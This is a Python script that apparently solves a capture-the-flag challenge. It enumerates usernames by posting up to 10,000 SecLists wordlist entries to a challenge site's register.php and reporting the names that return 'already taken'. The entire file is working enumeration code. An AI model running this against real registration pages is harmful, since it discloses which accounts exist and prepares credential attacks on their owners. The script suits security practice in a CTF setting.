import requests
import re
from tqdm import tqdm

url = "https://e23d97487a330d3b9f5139e2-greetings.challenge.master.cscg.live:31337/"
endpoint = "register.php"
success_message = "This username is already taken."
usernames_small = "top-usernames-shortlist.txt"
usernames_large = "xato-net-10-million-usernames.txt"
username_list = f"/usr/share/wordlists/seclists/Usernames/{usernames_large}"
stop = 10000

with open(username_list, "r") as usernames:
    for i in tqdm(range(stop), total=stop):
        login_payload = {
            "username": next(usernames)[:-1],
            "password": "testpassword",
            "confirm_password": "testpassword",
        }
        res = requests.post(
            url=url + endpoint,
            data=login_payload,
        )
        found_success = re.findall(
            success_message, res.text
        )
        if found_success:
            print(f"[*] Username for {login_payload.get('username')} is taken")
